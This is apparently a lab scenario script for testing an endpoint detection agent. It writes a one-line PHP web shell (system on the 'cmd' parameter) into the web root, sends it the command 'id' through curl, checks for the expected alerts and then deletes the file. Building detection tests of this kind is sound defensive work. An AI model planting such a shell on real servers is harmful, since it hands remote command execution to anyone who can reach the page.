#!/usr/bin/env bash
# A real PHP web shell served by Apache + PHP-FPM (T1505.003, issue #478 level 2,
# ADR-0022): the end-to-end case web-webshell.sh only imitates with a renamed shell.
#
# The script drops a one-line PHP file under the web root, then requests it with a
# command. PHP-FPM runs it and `system()` spawns a real shell, so the shell's parent is
# a real `php-fpm*` worker, and the request it came from is in Apache's access log. The
# agent should see, in this order: the file written under the web root (YARA, if the
# content rules are loaded), the request (a webshell-like signature), the shell spawned
# by php-fpm (lineage), and pair the last two (T1505.003).
#
# The web shell is created and removed by this script, on the machine it runs on: use a
# lab VM, never a server that serves anything.
#
# Prerequisites:
#   - Apache listening on 127.0.0.1:80 with PHP-FPM wired in (Debian/Ubuntu:
#     apache2, php-fpm, `a2enmod proxy_fcgi setenvif`, `a2enconf php*-fpm`), curl,
#     access log in the default combined format (/var/log/apache2/access.log).
#   - agent.toml declares it:
#         [[logs.sources]]
#         path = "/var/log/apache2/access.log"
#         kind = "access_combined"
#   - The agent can read the log: root, or CAP_DAC_READ_SEARCH.
#
# Usage:
#   1) terminal A: sudo target/release/agent --config /etc/synthaea/agent.toml run \
#        --alerts /tmp/a --events /tmp/e
#   2) terminal B: sudo ./lab/scenarios/web-webshell-php.sh
#   3) expected in /tmp/a within a few seconds: T1505.003 naming the WebshellLike
#      request (GET /uploads/c99.php param=cmd) and T1059 with parent php-fpm*

set -euo pipefail

BASE=${1:-http://127.0.0.1}
ROOT=${WEB_ROOT:-/var/www/html}
SHELL_FILE="$ROOT/uploads/c99.php"

command -v curl >/dev/null || { echo "curl is required" >&2; exit 1; }
[ "$(id -u)" -eq 0 ] || { echo "run as root: the script writes under $ROOT" >&2; exit 1; }
curl -s -o /dev/null --max-time 3 "$BASE/" || { echo "no web server answers at $BASE" >&2; exit 1; }

cleanup() { rm -f "$SHELL_FILE"; rmdir "$ROOT/uploads" 2>/dev/null || true; }
trap cleanup EXIT

mkdir -p "$ROOT/uploads"
printf '<?php system($_GET["cmd"]); ?>\n' > "$SHELL_FILE"
chmod 644 "$SHELL_FILE"
echo "Dropped $SHELL_FILE"

# Let the write be scanned and the log poller start from a quiet point.
sleep 3
echo "Running a command through it ..."
OUT=$(curl -s "$BASE/uploads/c99.php?cmd=id")
echo "web shell answered: ${OUT:-<nothing: PHP-FPM is not serving .php>}"
[ -n "$OUT" ] || { echo "PHP is not executed by this server; the scenario proves nothing" >&2; exit 1; }
sleep 3
echo "done. Alerts file: T1505.003 and T1059 (parent php-fpm*)."
